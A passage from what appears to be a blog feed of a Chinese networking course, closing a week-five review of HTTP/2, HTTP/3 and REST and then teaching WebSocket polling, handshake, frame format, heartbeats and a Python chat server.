class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">HTTP/2特性：<br><span class="hljs-bullet">- </span>二进制分帧<br><span class="hljs-bullet">- </span>多路复用<br><span class="hljs-bullet">- </span>头部压缩（HPACK）<br><span class="hljs-bullet">- </span>服务器推送<br><br>HTTP/3特性：<br><span class="hljs-bullet">- </span>基于QUIC（UDP）<br><span class="hljs-bullet">- </span>0-RTT连接<br><span class="hljs-bullet">- </span>无队头阻塞<br><span class="hljs-bullet">- </span>连接迁移<br><br>RESTful原则：<br><span class="hljs-bullet">- </span>资源导向<br><span class="hljs-bullet">- </span>统一接口<br><span class="hljs-bullet">- </span>无状态<br><span class="hljs-bullet">- </span>可缓存<br><br>WebSocket：<br><span class="hljs-bullet">- </span>全双工通信<br><span class="hljs-bullet">- </span>低延迟<br><span class="hljs-bullet">- </span>实时推送<br></code></pre></td></tr></table></figure><h3 id="实战项目总结"><a href="#实战项目总结" class="headerlink" title="实战项目总结"></a>实战项目总结</h3><ol><li>✅ HTTP&#x2F;2分析器</li><li>✅ QUIC演示程序</li><li>✅ 用户管理API</li><li>✅ WebSocket聊天室</li></ol><h3 id="性能对比数据"><a href="#性能对比数据" class="headerlink" title="性能对比数据"></a>性能对比数据</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile">协议性能（RTT=50ms）：<br><span class="hljs-section">HTTP/1.1: 200ms</span><br><span class="hljs-section">HTTP/2:   150ms</span><br><span class="hljs-section">HTTP/3:   50ms   ← 快4倍</span><br><br>实时通信：<br><span class="hljs-section">HTTP轮询:  延迟1000ms+</span><br><span class="hljs-section">WebSocket: 延迟&lt;10ms   ← 快100倍+</span><br></code></pre></td></tr></table></figure><h3 id="下周预告"><a href="#下周预告" class="headerlink" title="下周预告"></a>下周预告</h3><p><strong>第六周：DNS和其他应用层协议（Day 35-40）</strong></p><ul><li>Day 35: DNS深入</li><li>Day 36: DNS安全</li><li>Day 37: DNS服务器实现</li><li>Day 38: FTP&#x2F;SFTP</li><li>Day 39: 邮件协议</li><li>Day 40: 应用层总结</li></ul><hr><h2 id="学习建议"><a href="#学习建议" class="headerlink" title="学习建议"></a>学习建议</h2><h3 id="必须掌握"><a href="#必须掌握" class="headerlink" title="必须掌握"></a>必须掌握</h3><ol><li>HTTP&#x2F;2的多路复用原理</li><li>RESTful API设计规范</li><li>WebSocket握手和通信机制</li></ol><h3 id="实践任务"><a href="#实践任务" class="headerlink" title="实践任务"></a>实践任务</h3><ol><li>完成所有代码示例</li><li>使用Wireshark抓包分析</li><li>设计一个完整的API</li><li>实现一个实时应用</li></ol><h3 id="复习重点"><a href="#复习重点" class="headerlink" title="复习重点"></a>复习重点</h3><ul><li><input disabled="" type="checkbox"> HTTP版本对比</li><li><input disabled="" type="checkbox"> REST六大约束</li><li><input disabled="" type="checkbox"> WebSocket vs HTTP</li><li><input disabled="" type="checkbox"> API设计最佳实践</li></ul><hr><p><strong>进度：34&#x2F;120天（28.3%）</strong></p><p>第五周完成！你已经掌握了现代Web应用的核心通信技术。</p><p>继续前进，第六周见！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>31天：WebSocket实时通信</title>
    <link href="/2025/11/10/31%E5%A4%A9%EF%BC%9AWebSocket%E5%AE%9E%E6%97%B6%E9%80%9A%E4%BF%A1/"/>
    <url>/2025/11/10/31%E5%A4%A9%EF%BC%9AWebSocket%E5%AE%9E%E6%97%B6%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="第31天：WebSocket实时通信"><a href="#第31天：WebSocket实时通信" class="headerlink" title="第31天：WebSocket实时通信"></a>第31天：WebSocket实时通信</h1><blockquote><p>“WebSocket让Web应用拥有了真正的实时双向通信能力！”</p></blockquote><h2 id="📚-今日目标"><a href="#📚-今日目标" class="headerlink" title="📚 今日目标"></a>📚 今日目标</h2><ul><li>理解WebSocket协议原理</li><li>掌握WebSocket握手过程</li><li>学习WebSocket帧格式</li><li>实现WebSocket客户端和服务器</li><li>理解WebSocket vs HTTP轮询</li></ul><hr><h2 id="1-为什么需要WebSocket？"><a href="#1-为什么需要WebSocket？" class="headerlink" title="1. 为什么需要WebSocket？"></a>1. 为什么需要WebSocket？</h2><h3 id="1-1-HTTP的局限性"><a href="#1-1-HTTP的局限性" class="headerlink" title="1.1 HTTP的局限性"></a>1.1 HTTP的局限性</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs markdown">传统HTTP的问题：<br><br><span class="hljs-bullet">1.</span> 单向通信<br>   客户端 → 请求 → 服务器<br>   客户端 ← 响应 ← 服务器<br><br>   问题：服务器无法主动推送数据<br><br><span class="hljs-bullet">2.</span> 轮询方式效率低<br><br>   短轮询（Polling）：<br>   客户端每隔一段时间发送请求<br>   ┌─────────────────────────────────┐<br>   │ 客户端 → 有新消息吗？           │<br>   │ 服务器 ← 没有                   │<br>   │ (等待1秒)                       │<br>   │ 客户端 → 有新消息吗？           │<br>   │ 服务器 ← 没有                   │<br>   │ (等待1秒)                       │<br>   │ 客户端 → 有新消息吗？           │<br>   │ 服务器 ← 有！这是消息           │<br>   └─────────────────────────────────┘<br><br>   缺点：<br><span class="hljs-bullet">   -</span> 大量无用请求<br><span class="hljs-bullet">   -</span> 资源浪费<br><span class="hljs-bullet">   -</span> 实时性差<br><br>   长轮询（Long Polling）：<br>   客户端发送请求，服务器hold住连接<br>   有消息时才返回<br>   ┌─────────────────────────────────┐<br>   │ 客户端 → 有新消息吗？           │<br>   │ (服务器等待...)                 │<br>   │ (有新消息!)                     │<br>   │ 服务器 ← 有！这是消息           │<br>   │ 客户端 → 有新消息吗？(立即重连) │<br>   └─────────────────────────────────┘<br><br>   改进：实时性好<br>   缺点：仍需频繁建立连接<br><br>生活化类比：<br>HTTP轮询 = 不停问：&quot;快递到了吗？&quot;<br>WebSocket = 快递员：&quot; 到了我就告诉你&quot;<br></code></pre></td></tr></table></figure><hr><h2 id="2-WebSocket协议详解"><a href="#2-WebSocket协议详解" class="headerlink" title="2. WebSocket协议详解"></a>2. WebSocket协议详解</h2><h3 id="2-1-WebSocket特点"><a href="#2-1-WebSocket特点" class="headerlink" title="2.1 WebSocket特点"></a>2.1 WebSocket特点</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs markdown">WebSocket协议特性：<br><br><span class="hljs-bullet">1.</span> 全双工通信<br>   ┌──────────────────────────────┐<br>   │  客户端 ←──数据──→ 服务器    │<br>   │         双向实时通信          │<br>   └──────────────────────────────┘<br><br><span class="hljs-bullet">2.</span> 基于TCP<br><span class="hljs-bullet">   -</span> 可靠传输<br><span class="hljs-bullet">   -</span> 有序交付<br><span class="hljs-bullet">   -</span> 流量控制<br><br><span class="hljs-bullet">3.</span> 低开销<br><span class="hljs-bullet">   -</span> 握手后无需HTTP头<br><span class="hljs-bullet">   -</span> 帧开销小（2-14字节）<br><span class="hljs-bullet">   -</span> 适合高频消息<br><br><span class="hljs-bullet">4.</span> 保持连接<br><span class="hljs-bullet">   -</span> 长连接<br><span class="hljs-bullet">   -</span> 无需重复建立<br><br><span class="hljs-bullet">5.</span> 支持文本和二进制<br><span class="hljs-bullet">   -</span> 文本帧：UTF-8编码<br><span class="hljs-bullet">   -</span> 二进制帧：任意数据<br><br>协议标识：<br>ws://example.com/socket   # 非加密<br>wss://example.com/socket  # TLS加密（推荐）<br></code></pre></td></tr></table></figure><h3 id="2-2-WebSocket握手"><a href="#2-2-WebSocket握手" class="headerlink" title="2.2 WebSocket握手"></a>2.2 WebSocket握手</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs nix">WebSocket握手过程：<br><br>客户端请求（HTTP Upgrade）：<br>GET <span class="hljs-symbol">/chat</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> example.com<br><span class="hljs-params">Upgrade:</span> websocket<br><span class="hljs-params">Connection:</span> Upgrade<br><span class="hljs-params">Sec-WebSocket-Key:</span> dGhlIHNhbXBsZSBub25jZQ<span class="hljs-operator">==</span><br><span class="hljs-params">Sec-WebSocket-Version:</span> <span class="hljs-number">13</span><br><br>关键头部：<br><span class="hljs-operator">-</span> <span class="hljs-params">Upgrade:</span> websocket         <span class="hljs-comment"># 请求升级到WebSocket</span><br><span class="hljs-operator">-</span> <span class="hljs-params">Connection:</span> Upgrade        <span class="hljs-comment"># 连接升级</span><br><span class="hljs-operator">-</span> <span class="hljs-params">Sec-WebSocket-Key:</span> xxx     <span class="hljs-comment"># 随机密钥（Base64）</span><br><span class="hljs-operator">-</span> <span class="hljs-params">Sec-WebSocket-Version:</span> <span class="hljs-number">13</span>  <span class="hljs-comment"># WebSocket版本</span><br><br>服务器响应：<br>HTTP<span class="hljs-symbol">/1.1</span> <span class="hljs-number">101</span> Switching Protocols<br><span class="hljs-params">Upgrade:</span> websocket<br><span class="hljs-params">Connection:</span> Upgrade<br><span class="hljs-params">Sec-WebSocket-Accept:</span> s3pPLMBiTxaQ9kYGzzhZRbK<span class="hljs-operator">+</span>xOo<span class="hljs-operator">=</span><br><br>关键头部：<br><span class="hljs-operator">-</span> <span class="hljs-number">101</span> Switching Protocols    <span class="hljs-comment"># 切换协议</span><br><span class="hljs-operator">-</span> <span class="hljs-params">Sec-WebSocket-Accept:</span> xxx  <span class="hljs-comment"># 确认密钥</span><br><br>Accept计算方法：<br><span class="hljs-number">1</span>. 拼接：Sec-WebSocket-Key <span class="hljs-operator">+</span> <span class="hljs-string">&quot;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;</span><br><span class="hljs-number">2</span>. SHA-<span class="hljs-number">1</span>哈希<br><span class="hljs-number">3</span>. Base64编码<br><br>握手完成后：<br><span class="hljs-operator">-</span> HTTP协议升级为WebSocket<br><span class="hljs-operator">-</span> 开始使用WebSocket帧传输数据<br></code></pre></td></tr></table></figure><h3 id="2-3-WebSocket帧格式"><a href="#2-3-WebSocket帧格式" class="headerlink" title="2.3 WebSocket帧格式"></a>2.3 WebSocket帧格式</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">WebSocket数据帧结构：<br><br> 0                   1                   2                   3<br> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1<br>+-+-+-+-+-------+-+-------------+-------------------------------+<br>|<span class="hljs-string">F</span>|<span class="hljs-string">R</span>|<span class="hljs-string">R</span>|<span class="hljs-string">R</span>|<span class="hljs-string"> opcode</span>|<span class="hljs-string">M</span>|<span class="hljs-string"> Payload len </span>|<span class="hljs-string">    Extended payload length    </span>|<br>|<span class="hljs-string">I</span>|<span class="hljs-string">S</span>|<span class="hljs-string">S</span>|<span class="hljs-string">S</span>|<span class="hljs-string">  (4)  </span>|<span class="hljs-string">A</span>|<span class="hljs-string">     (7)     </span>|<span class="hljs-string">             (16/64)           </span>|<br>|<span class="hljs-string">N</span>|<span class="hljs-string">V</span>|<span class="hljs-string">V</span>|<span class="hljs-string">V</span>|<span class="hljs-string">       </span>|<span class="hljs-string">S</span>|<span class="hljs-string">             </span>|<span class="hljs-string">   (if payload len==126/127)   </span>|<br>|<span class="hljs-string"> </span>|<span class="hljs-string">1</span>|<span class="hljs-string">2</span>|<span class="hljs-string">3</span>|<span class="hljs-string">       </span>|<span class="hljs-string">K</span>|<span class="hljs-string">             </span>|<span class="hljs-string">                               </span>|<br>+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +<br>|<span class="hljs-string">     Extended payload length continued, if payload len == 127  </span>|<br>+ - - - - - - - - - - - - - - - +-------------------------------+<br>|<span class="hljs-string">                               </span>|<span class="hljs-string">Masking-key, if MASK set to 1  </span>|<br>+-------------------------------+-------------------------------+<br>|<span class="hljs-string"> Masking-key (continued)       </span>|<span class="hljs-string">          Payload Data         </span>|<br>+-------------------------------- - - - - - - - - - - - - - - - +<br>:                     Payload Data continued ...                :<br>+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +<br>|<span class="hljs-string">                     Payload Data continued ...                </span>|<br>+---------------------------------------------------------------+<br><br>字段说明：<br><br>1. FIN (1 bit)<br>   - 1: 最后一帧<br>   - 0: 后续还有帧<br><br>2. RSV1, RSV2, RSV3 (各1 bit)<br>   - 保留位，通常为0<br><br>3. Opcode (4 bits)<br>   - 0x0: 继续帧<br>   - 0x1: 文本帧<br>   - 0x2: 二进制帧<br>   - 0x8: 关闭连接<br>   - 0x9: Ping<br>   - 0xA: Pong<br><br>4. MASK (1 bit)<br>   - 1: 负载已掩码（客户端必须设置）<br>   - 0: 负载未掩码<br><br>5. Payload length (7/7+16/7+64 bits)<br>   - 0-125: 实际长度<br>   - 126: 后续16位表示长度<br>   - 127: 后续64位表示长度<br><br>6. Masking-key (0 or 4 bytes)<br>   - 掩码密钥（仅MASK=1时存在）<br><br>7. Payload Data<br>   - 实际数据<br></code></pre></td></tr></table></figure><h3 id="2-4-心跳机制"><a href="#2-4-心跳机制" class="headerlink" title="2.4 心跳机制"></a>2.4 心跳机制</h3><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">WebSocket心跳（Ping/Pong）：<br><br>作用：<br><span class="hljs-number">1.</span> 保持连接活跃<br><span class="hljs-number">2.</span> 检测连接是否断开<br><span class="hljs-number">3.</span> 防止中间代理超时关闭<br><br>Ping/Pong机制：<br>客户端 → Ping → 服务器<br>客户端 ← Pong ← 服务器<br><br>实现方式：<br><span class="hljs-comment"># 客户端</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (ws.readyState === WebSocket.OPEN) &#123;<br>        ws.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;type: <span class="hljs-string">&#x27;ping&#x27;</span>&#125;));<br>    &#125;<br>&#125;, <span class="hljs-number">30000</span>);  <span class="hljs-regexp">//</span> 每<span class="hljs-number">30</span>秒发送一次<br><br><span class="hljs-comment"># 服务器</span><br><span class="hljs-keyword">if</span> (message.type === <span class="hljs-string">&#x27;ping&#x27;</span>) &#123;<br>    ws.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;type: <span class="hljs-string">&#x27;pong&#x27;</span>&#125;));<br>&#125;<br><br>超时检测：<br>let pongReceived = <span class="hljs-literal">true</span>;<br><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!pongReceived) &#123;<br>        <span class="hljs-regexp">//</span> 超时，关闭连接<br>        ws.close();<br>    &#125;<br>    pongReceived = <span class="hljs-literal">false</span>;<br>    ws.ping();<br>&#125;, <span class="hljs-number">30000</span>);<br><br>ws.<span class="hljs-literal">on</span>(<span class="hljs-string">&#x27;pong&#x27;</span>, <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>    pongReceived = <span class="hljs-literal">true</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><hr><h2 id="3-实战项目：WebSocket服务器"><a href="#3-实战项目：WebSocket服务器" class="headerlink" title="3. 实战项目：WebSocket服务器"></a>3. 实战项目：WebSocket服务器</h2><h3 id="3-1-代码实现"><a href="#3-1-代码实现" class="headerlink" title="3.1 代码实现"></a>3.1 代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day31_websocket_server.py</span><br><span class="hljs-comment"># 功能：WebSocket服务器实现</span><br><span class="hljs-comment"># 需要安装：pip install websockets</span><br><br><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> websockets<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># 存储所有连接的客户端</span><br>connected_clients = <span class="hljs-built_in">set</span>()<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_client</span>(<span class="hljs-params">websocket, path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    处理客户端连接</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        websocket: WebSocket连接对象</span><br><span class="hljs-string">        path: 连接路径</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 添加到连接集合</span><br>    connected_clients.add(websocket)<br>    client_id = <span class="hljs-built_in">id</span>(websocket)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;datetime.now()&#125;</span>] 客户端连接: <span class="hljs-subst">&#123;client_id&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前在线: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(connected_clients)&#125;</span> 人&quot;</span>)<br><br>    <span class="hljs-comment"># 发送欢迎消息</span><br>    welcome_msg = &#123;<br>        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;system&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;欢迎加入聊天室！当前在线 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(connected_clients)&#125;</span> 人&quot;</span>,<br>        <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>    &#125;<br>    <span class="hljs-keyword">await</span> websocket.send(json.dumps(welcome_msg, ensure_ascii=<span class="hljs-literal">False</span>))<br><br>    <span class="hljs-comment"># 广播用户加入消息</span><br>    join_msg = &#123;<br>        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user_join&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;用户 <span class="hljs-subst">&#123;client_id&#125;</span> 加入了聊天室&quot;</span>,<br>        <span class="hljs-string">&quot;online_count&quot;</span>: <span class="hljs-built_in">len</span>(connected_clients),<br>        <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>    &#125;<br>    <span class="hljs-keyword">await</span> broadcast(json.dumps(join_msg, ensure_ascii=<span class="hljs-literal">False</span>), exclude=websocket)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 持续接收消息</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> message <span class="hljs-keyword">in</span> websocket:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;datetime.now()&#125;</span>] 收到消息: <span class="hljs-subst">&#123;message&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># 解析JSON消息</span><br>                data = json.loads(message)<br><br>                <span class="hljs-comment"># 处理不同类型的消息</span><br>                <span class="hljs-keyword">if</span> data.get(<span class="hljs-string">&#x27;type&#x27;</span>) == <span class="hljs-string">&#x27;ping&#x27;</span>:<br>                    <span class="hljs-comment"># 心跳响应</span><br>                    pong_msg = &#123;<br>                        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;pong&quot;</span>,<br>                        <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>                    &#125;<br>                    <span class="hljs-keyword">await</span> websocket.send(json.dumps(pong_msg))<br><br>                <span class="hljs-keyword">elif</span> data.get(<span class="hljs-string">&#x27;type&#x27;</span>) == <span class="hljs-string">&#x27;chat&#x27;</span>:<br>                    <span class="hljs-comment"># 聊天消息，广播给所有人</span><br>                    chat_msg = &#123;<br>                        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;chat&quot;</span>,<br>                        <span class="hljs-string">&quot;from&quot;</span>: client_id,<br>                        <span class="hljs-string">&quot;message&quot;</span>: data.get(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>),<br>                        <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>                    &#125;<br>                    <span class="hljs-keyword">await</span> broadcast(json.dumps(chat_msg, ensure_ascii=<span class="hljs-literal">False</span>))<br><br>            <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>                <span class="hljs-comment"># 非JSON消息，直接广播</span><br>                text_msg = &#123;<br>                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;chat&quot;</span>,<br>                    <span class="hljs-string">&quot;from&quot;</span>: client_id,<br>                    <span class="hljs-string">&quot;message&quot;</span>: message,<br>                    <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>                &#125;<br>                <span class="hljs-keyword">await</span> broadcast(json.dumps(text_msg, ensure_ascii=<span class="hljs-literal">False</span>))<br><br>    <span class="hljs-keyword">except</span> websockets.exceptions.ConnectionClosed:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;datetime.now()&#125;</span>] 客户端 <span class="hljs-subst">&#123;client_id&#125;</span> 连接关闭&quot;</span>)<br><br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-comment"># 移除连接</span><br>        connected_clients.remove(websocket)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前在线: <span 